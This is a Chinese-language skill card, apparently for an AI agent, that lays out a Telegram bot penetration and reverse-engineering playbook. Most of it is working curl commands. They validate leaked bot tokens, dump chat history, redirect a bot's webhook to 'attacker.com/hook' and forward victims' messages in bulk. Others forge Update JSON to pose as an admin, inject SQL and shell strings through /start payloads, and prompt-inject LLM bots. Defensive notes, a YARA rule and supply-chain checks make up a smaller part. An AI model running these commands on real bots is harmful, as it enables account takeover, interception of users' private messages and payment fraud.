---
name: 太白云生·钩
description: >-
 TG Bot 渗透逆向全链（5 面攻击面）：
 A 面 Token 泄露→全接管（JS 硬编码/GitHub/.env/恶意样本/测绘 body 搜）；
 B 面 Webhook 伪造（secret_token 校验缺失/CVE-2026-28454/框架差异矩阵）；
 C 面 Bot 业务逻辑（/start payload 注入/callback_data 篡改/Stars 支付伪造/IDOR）；
 D 面 恶意生态情报（C2 拦截/Stealer 逆向/Drainer 家族/聚类运营者）；
 E 面 客户端源码供应链（框架 CVE 审计/供应链投毒检测/MTProto 协议攻击）。
 含 BOLA 越权写 /admin/telegram/bot 配置、Webhook 劫持、
 Bot Token 泄露 getMe/getUpdates/setWebhook/sendMessage 接管、
 伪造 Update JSON、callback_query 伪造、Fatal Error 行号溯源、
 ANY.RUN 拦截方法论、PyInstaller 解包、JS 反混淆、供应链投毒、
 matkap 猎杀面板、Netlas/FOFA body 搜 token。
 
 Mini App/initData 走 telegram-webapp-api-pentest；
 管理后台 NEXTAUTH 走 tg-bot-nextauth-takeover；
 Bot 池/群发面板走 tg-bot-pool-panel-pentest。
version: 3.1.0
metadata:
    tags:
      - telegram
      - bot
      - webhook
      - token-leak
      - bot-api
      - hijack
      - bola
      - drainer
      - stealer
      - c2
      - supply-chain
      - reverse
      - cve-2026-28454
      - callback-data
      - stars-payment
      - matkap
    category: telegram
    priority: 1
    attack_phases: [recon, exploit, post-exploit, intel]
    target_stack: [telegram-bot-api, python-telegram-bot, aiogram, telegraf, grammy, node-telegram-bot-api]
---

> **太白云生**
> 江山如故人未还，一羽千里破云关。
> 师弟二字恩与债，逆流河底鹤难还。

# TG Bot 渗透逆向全链（5 面攻击面）

**前提**：目标在 `授权范围`。`--set-webhook --confirm` 会中断原通知流 → **先问**或用测试 bot。

## 攻击面全景

```
                 ┌─────────────────────────────────────────────┐
                 │  目标：一个 TG bot（或运营 bot 的整套业务）   │
                 └─────────────────────────────────────────────┘
                                   │
  ┌──────────────┬────────────────┼───────────────────┬─────────────────┐
  ▼              ▼                ▼                   ▼                 ▼
A. Token 面    B. Webhook/后端面  C. Bot 业务逻辑面   D. 生态/情报面    E. 客户端/源码面
token泄露→接管  伪造update/SSRF   命令注入/IDOR/逻辑  C2拦截/聚类       恶意样本逆向
前端JS/.env     验签缺失          /start payload     stealer家族       PyInstaller/JS
GitHub检索      secret_token      callback data      drainer家族       供应链投毒
```

## 成功口径

| 级别 | BOLA 路径 | Token 泄露链 | Webhook 伪造链 | 业务逻辑链 |
|------|----------|-------------|---------------|-----------|
| L1 | USER 可写配置 | `getMe` 有效 | secret_token 缺失确认 | /start payload 注入 |
| L2 | 自控 URL 收到 Update | `getUpdates` 读到历史 | 伪造 update 执行命令 | callback_data 越权 |
| L3 | — | webhook 无签名可伪造 | 伪造 admin from.id 提权 | Stars 支付伪造白嫖 |
| L4 | — | 伪造 callback 触发业务 | 绑定钱包/截获清算 | — |

---

## A 面：Token 泄露 → 全接管（最高频入口）

### Token 格式与核心 API

```bash
# Token 格式：<bot_id>:<35位secret>
# grep 正则
grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'

# 验证
curl -s "https://api.telegram.org/bot${TOKEN}/getMe" | python3 -m json.tool

# 回放历史消息（含聊天上下文）
curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1000"

# 冒充 bot 发消息
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" -d text="test"

# 查看当前 webhook 配置（评估动静）
curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"

# 截流：将所有消息转到攻击者 URL（⚠️ 先问）
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/setWebhook" \
  -d url="https://attacker.com/hook"

# 批量转储消息（≤100 条/次）
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/forwardMessages" \
  -H "Content-Type: application/json" \
  -d '{"chat_id":"MY_GROUP","from_chat_id":"VICTIM_CHAT","message_ids":[1,2,3]}'
```

> ⚠️ 拿到 token 不要立刻 `getUpdates` 拉全部历史——某些运营者会监控 bot 状态。先 `getWebhookInfo`（有 webhook 说明 bot 在跑，动静大），再决定截流还是只 `forwardMessage` 特定消息。

### Token 泄露途径与实战打法

| 途径 | 打法 | 要点 |
|------|------|------|
| **客户端 JS 硬编码** | `curl -s https://target/_nuxt/*.js \| grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'` | Nuxt/React/Vue chunk 直接硬编码，CVSS 8.1 |
| **表单请求透传** | 抓 "Contact us" 等表单提交请求，看请求体/URL 是否带 token | 无密码无 2FA 直接登录 bot |
| **GitHub 仓库/历史** | `gitleaks detect --source . --report-format json`；`trufflehog git https://github.com/target` | 加规则 `[0-9]{10}:[A-Za-z0-9_-]{35}` |
| **.env / docker-compose** | 目录爆破 + 配置泄露：`/.env`、`/docker-compose.yml`、`/config.yml` | `BOT_TOKEN=` / `TELEGRAM_TOKEN=` |
| **恶意样本硬编码** | PyInstaller 解包、JS 反混淆、APK 反编译提取 | Stealer/RAT 必带 token 明文 |
| **钓鱼 kit 泄露** | open dir 挖 `sign/*.html` 每个变体轮换自己的 token | 同站再挖 AiTM 操作台 bot |
| **kit 开发者后门** | 钓鱼 kit 内置 JQ.js 后门偷运营者 token POST 到硬编码地址 | 先调 Bot API 验证 token 有效性 |
| **日志泄露** | `laravel.log`、`app.log`、`debug.log` 中搜 token 正则 | Fatal Error 行号溯源 |

### 批量发现（测绘角度）

```bash
# FOFA 搜包含 Telegram Bot API 调用的站点
python3 tools/space-search/fofa_query.py 'body="api.telegram.org"' --fields host,ip,port,title

# Netlas 内容搜索（分层：getUpdates 最有价值）
# http.body="api.telegram.org" AND http.body="getUpdates"

# VirusTotal 检索通信样本 → contacted URL 原文带 token
# 搜 contacted_urls:api.telegram.org → 提取 token+chat_id

# 本地探针（授权目标）
python3 炼蛊房/tg_bot_token_probe.py hunt \
  --target https://授权目标 --case <案卷>
```

---

## B 面：Webhook/后端攻击

### Webhook 签名校验矩阵

| 框架 | 默认是否校验 secret_token | 安全配置 |
|------|------------------------|---------|
| python-telegram-bot | ❌ 不校验 | `Application.run_webhook(secret_token=...)` |
| aiogram | ❌ 需显式 | `run_webhook(secret_token=...)` |
| telegraf (Node) | ❌ 需显式 | `bot.launch({webhook:{secretToken:...}})` |
| grammY (Node/Deno) | ❌ 需显式 | `webhookCallback(bot, {secretToken:...})` |
| php-telegram-bot | ❌ 需显式 | 自行校验 `X-Telegram-Bot-Api-Secret-Token` header |

**未配置 secret_token = 任何人都能 POST 伪造 Update JSON。**

### CVE-2026-28454 — OpenClaw Webhook 无签名（CVSS 9.1）

```
GHSA-fhvm-j76f-qmjv
webhook 模式未配置 secret → 接受任意 POST →
伪造 message.from.id/chat.id → 绕过 sender 白名单执行特权命令。
```

### F-2026-0005 — Webhook 签名缺失 + Anti-Replay 绕过

```
控制器不验签，且用攻击者可控的 update_id 当反重放键 →
完全绕过 anti-replay → 伪造带有效 auth code 的 /start →
把受害者钱包绑定到自己 TG 账号，截获清算警报。
```

### 伪造 Update 最小骨架

```json
{
  "update_id": 999999,
  "message": {
    "message_id": 1,
    "from": {"id": 67890, "is_bot": false, "first_name": "Attacker"},
    "chat": {"id": 67890, "type": "private"},
    "date": 1700000000,
    "text": "/start VALID_AUTH_CODE_HERE"
  }
}
```

```bash
# 探测 webhook 端点（常见路径）
for path in /webhook /bot /telegram/webhook /api/webhook /api/telegram \
  /bot/webhook /.well-known/telegram; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    "https://target${path}" -H "Content-Type: application/json" \
    -d '{"update_id":1}')
  echo "$path → $code"
done

# 伪造 Update（无 secret_token 时）
curl -s -X POST "https://target/webhook" \
  -H "Content-Type: application/json" \
  -d @fake_update.json

# 伪造 admin 身份执行特权命令
curl -s -X POST "https://target/webhook" \
  -H "Content-Type: application/json" \
  -d '{"update_id":999,"message":{"message_id":1,"from":{"id":ADMIN_ID,"is_bot":false,"first_name":"Admin"},"chat":{"id":ADMIN_ID,"type":"private"},"date":1700000000,"text":"/admin_cmd"}}'
```

### 反代配置错误

- nginx/网关吞掉 `X-Telegram-Bot-Api-Secret-Token` header → 校验永不生效
- webhook 路径可预测（/webhook、/bot、Swagger 暴露）
- `setWebhook` 指向内部地址 → SSRF 面
- CVE-2025-13068：WordPress Telegram Bot & Channel Plugin 存储型 XSS（username 未净化）

### BOLA 路径（管理 API 越权写 Bot 配置）

```bash
# USER Token 打 admin 路径
python3 炼蛊房/tg_bot_admin_bac.py probe \
  --base https://授权API --case <案卷> --token "$USER_JWT"
```

---

## C 面：Bot 业务逻辑漏洞

| 漏洞类型 | 原理 | 利用手法 |
|---------|------|---------|
| **身份只信 from.id** | bot 判权只看 `update.message.from.id`，不验 webhook 来源 | 伪造 update（见 B 面）或用他人真实 ID |
| **/start payload 注入** | `t.me/bot?start=<payload>` 64 字符上限 | payload 当参数传给后端：SQLi/命令注入/逻辑参数（如 `start=admin_promo` 白嫖） |
| **callback_data 篡改** | inline button 回调数据客户端可控 | 改 callback_data 触发未授权操作；枚举敏感内容 |
| **Stars 支付伪造** | 不验 `successful_payment` 真伪就发货 | 伪造支付回调白嫖数字商品（校验 `provider_payment_charge_id`） |
| **deep-link token 泄露** | 邀请/验证链接把用户标识放 start 参数 | 截获 start payload 撞出未授权态 |
| **命令/文件路径注入** | bot 后端 shell 拼接用户输入 | echo bot 模板即典型：用户文本直接插 shell → 命令注入 |
| **LLM bot prompt injection** | AI bot 把聊天内容当指令 | 泄露 system prompt/flag/密钥 |
| **SQL 注入** | bot 后端拼接查询 | 私密消息全暴露 |

```bash
# 功能枚举
# 对目标 bot 发：/start /help /admin /debug /status /config /settings
# 抓 inline query、callback、web app 按钮、Deep link 参数
# 从 bot 回包找后端 API 域名 → 转 WebApp/后台打法

# /start payload 注入测试
# t.me/target_bot?start=admin_promo
# t.me/target_bot?start='OR+1=1--
# t.me/target_bot?start=;id;

# callback_data 篡改（需抓包改 callback_query.data）
# 原始：callback_data="buy_item_123"
# 篡改：callback_data="buy_item_0" 或 "admin_panel"
```

---

## D 面：恶意生态情报利用（C2/Stealer/Drainer）

### 拦截 exfil 标准方法论（ANY.RUN 公开技术）

```bash
# ① 从沙箱/代理抓样本请求 → 拿 token + chat_id
# ② 查看当前 webhook
curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"

# ③ 如有 webhook → 保存配置 → 删除（避免真实接收端抢先消费）
curl -s "https://api.telegram.org/bot${TOKEN}/deleteWebhook"

# ④ 建 TG 群 + 把自己设匿名 → 把 bot 拉进群
# ⑤ 重置 update offset
curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1"

# ⑥ 清空历史，此后新消息只发到我们群
LAST_ID=$(curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1" | python3 -c "import sys,json; r=json.load(sys.stdin); print(r['result'][-1]['update_id']+1 if r['result'] else 0)")
curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${LAST_ID}"

# ⑦ 批量前转运营者消息到我们群
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/forwardMessages" \
  -H "Content-Type: application/json" \
  -d "{\"chat_id\":\"${MY_GROUP}\",\"from_chat_id\":\"${VICTIM_CHAT}\",\"message_ids\":[1,2,3,4,5]}"
# ≤100 条/次，分钟级可稳定 2000+ 条

# ⑧ 完事恢复 webhook（如原配置存在）
```

**情报价值**：`getMe`/`getMyDescription`/`getWebhookInfo`/群成员与聊天历史 → 反查运营者身份、家族归属、webhook 基础设施（IOC pivot：webhook.site / *.pipedream.net / *.trycloudflare.com 等中继特征）。

### Drainer 家族逆向要点（JS 层）

- token + chat_id + 运营者钱包地址直接写在 JS 头部变量
- 区域检查（ipapi.co / cloudflare trace）过滤 CIS → 反向绕过需伪装 IP + navigator.language
- 混淆对抗：先搜 `api.telegram.org`、`bot`、`chat_id` 字符串锚点 → 沿调用回推
- 用 de4js / 自写 AST 反混淆 + 运行时 hook console/WebSocket

### Stealer/RAT 逆向链

```bash
# PyInstaller 解包
python3 pyinstxtractor.py target.exe
# 反编译
uncompyle6 extracted/telegrambt.pyc > telegrambt.py
# 提取 token
grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}' telegrambt.py

# 验证并采集情报
curl -s "https://api.telegram.org/bot${TOKEN}/getMe"
curl -s "https://api.telegram.org/bot${TOKEN}/getMyDescription"
```

### 聚类方法

同 token / 同 webhook URL / 同 bot description → 同一运营者。VirusTotal contacted URL 直接含 token 原文可批量聚类。

---

## E 面：客户端/源码/供应链

### 框架已知 CVE

| 框架 | 漏洞 | 影响 |
|------|------|------|
| aiogram < 3.22.0 | initData 校验用 `==` 非 `hmac.compare_digest` | 时序侧信道 |
| pyTelegramBotAPI | 链 aiohttp CVE-2024-23334 目录穿越 | 文件读 |
| aiogram | aiohttp CVE-2026-47265/54273-54278 DoS 家族 | 拒绝服务 |
| node-telegram-bot-api | 废弃依赖 request/form-data/tough-cookie | 多个已知洞 |

```bash
# 依赖审计（拿到 bot 源码时）
pip-audit -r requirements.txt
npm audit
osv-scanner --lockfile package-lock.json
```

### 供应链投毒检测

| 恶意包 | 手法 | 检测 |
|-------|------|------|
| pyronut | 冒牌 pyrogram，`Client.start()` 植入后门，`/e` = RCE | 检查 `__init__.py` 异常 import |
| gram-utilz / flashbot-sdk-eth | 同一 TG bot token 收赃 | 提取 token → getMe 反查 |
| 越南 TG 禁令后 Ruby gems | 替换 API base 指向攻击者 relay | 检查 API endpoint 是否标准 |
| dsfsdfds PyPI 系列 | `__init__.py` 藏发送逻辑 | grep `api.telegram.org` |

### YARA 规则（样本扫描）

```yara
rule HUNT_Telegram_Bot_API {
  strings:
    $api = "api.telegram.org" ascii wide
    $getMe = "getMe" ascii
    $getUpdates = "getUpdates" ascii
    $setWebhook = "setWebhook" ascii
    $deleteWebhook = "deleteWebhook" ascii
    $token = /[0-9]{10}:[A-Za-z0-9_-]{35}/ ascii
  condition:
    $api and ($token or 2 of ($getMe, $getUpdates, $setWebhook, $deleteWebhook))
}
```

---

## 工具链速查

| 工具 | 用途 | 链接 |
|------|------|------|
| **tg_bot_token_probe.py** | token 发现+验证+情报采集+伪造 Update 测试 | `炼蛊房/tg_bot_token_probe.py` |
| **tg_bot_admin_bac.py** | BOLA 越权写 Bot 配置 | `炼蛊房/tg_bot_admin_bac.py` |
| matkap | 恶意 bot 猎杀面板：token 验证/forwardMessage/IOC | github.com/0x6rss/matkap |
| ANY.RUN scripts | prepare_bot.py/forward_message(s).py 拦截脚本 | github.com/anyrun/blog-scripts |
| gitleaks / trufflehog | 仓库 token 扫描 | gitleaks.github.io |
| pip-audit / npm audit | bot 源码依赖审计 | — |
| pyinstxtractor | PyInstaller 解包 | github.com/extremecoders-re/pyinstxtractor |
| de4js | JS 反混淆 | leizongmin.github.io/de4js |
| Netlas / FOFA / Shodan | body 搜 `api.telegram.org` | — |

## 强制行为

1. 先用 USER Token 打 admin 路径证明越权，再谈劫持。
2. 默认 `probe` **不改** webhook；显式 `--set-webhook --confirm` 才写。
3. 授权测试结束后建议恢复原 webhook。
4. 通知/STATUS 脱敏，不把 bot token 写进可公开文档。
5. 拿到 token 先 `getWebhookInfo` 评估动静，再决定操作深度。
6. 恶意生态情报采集：只读操作（getMe/getUpdates/forwardMessage），不主动 sendMessage 冒充。

## 实战流程（浓缩）

```
① 目标确认：bot @username → /start /help 摸功能 → 抓转发链路里的后端域名
② Token 挖掘：JS/.env/GitHub/git history/测绘 body 搜/恶意样本
   → getMe 验证 → getWebhookInfo 评估动静 → 最小化利用
③ 后端渗透：webhook 伪造（无 secret_token）→ 业务洞（SQLi/IDOR/payload）
   → 管理后台走 tg-bot-nextauth-takeover / tg-bot-pool-panel-pentest
④ 逆向深化（黑产 bot）：PyInstaller/JS 反混淆/APK → token+chat_id+后端 API
   → 情报采集+聚类
⑤ 交付：复现步骤 + 利用链 + 修复建议
```

## 关联技能

| 场景 | 走哪张卡 |
|------|---------|
| 管理后台 NEXTAUTH/KyberRouter | `tg-bot-nextauth-takeover` |
| Bot 池/群发面板 | `tg-bot-pool-panel-pentest` |
| Mini App/WebApp initData | `telegram-webapp-api-pentest` |
| Mini App GraphQL | `telegram-miniapp-graphql-pentest` |
| Bot 侦察发现 | `telegram-bot-discovery` |
| TG 云控面板 Fernet/Sticker | `tg-cloud-panel` |
| TG 号码管理后台 | `tg-number-admin-pentest` |

## 真源

- `传承/飞鸽傀·拆骨.md`（A-E 五面全链）
- `传承/飞鸽傀·钩.md`（§1-§9 BOLA 路径）
- 探针：`炼蛊房/tg_bot_token_probe.py`
- 参考：CVE-2026-28454 (GHSA-fhvm-j76f-qmjv)、F-2026-0005 (zealynx)
